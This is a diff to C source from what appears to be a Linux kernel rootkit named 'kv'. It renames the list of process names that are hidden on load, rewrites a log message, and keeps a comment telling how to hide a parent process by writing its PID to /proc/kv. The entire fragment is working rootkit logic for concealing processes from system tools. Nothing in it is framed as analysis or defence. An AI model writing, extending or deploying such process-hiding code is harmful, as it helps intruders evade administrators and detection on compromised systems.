@@ -465,14 +465,13 @@ void kv_scan_and_hide(void) {
         if (kv_find_hidden_task(t)) continue;
         if (!(fnode = fs_get_file_node(t))) continue;
 
-        /* XXX: optimise this */
-        for (; hide_on_load_list[i] != NULL; ++i) {
-            if (strncmp(hide_on_load_list[i], t->comm, strlen(hide_on_load_list[i]))) continue;
-            prinfo("Hide netapp task: %d %s i=%d '%s'\n", t->pid, fnode->filename, i, hide_on_load_list[i]);
+        for (; kv_hide_ps_on_load[i] != NULL; ++i) {
+            if (strncmp(kv_hide_ps_on_load[i], t->comm, strlen(kv_hide_ps_on_load[i]))) continue;
+            prinfo("Hide task name '%s' from '%s' of pid %d\n", t->comm, fnode->filename, t->pid);
             /**
              * notice that any netapp added here
              * will NOT be killed if kv is unloaded
-             * In reality an application that is listed in hide_on_load_list will be handled
+             * In reality an application that is listed in kv_hide_ps_on_load will be handled
              * in the same way as if you manually hide a parent process:
              *  echo <pid of parent> >/proc/kv
              */
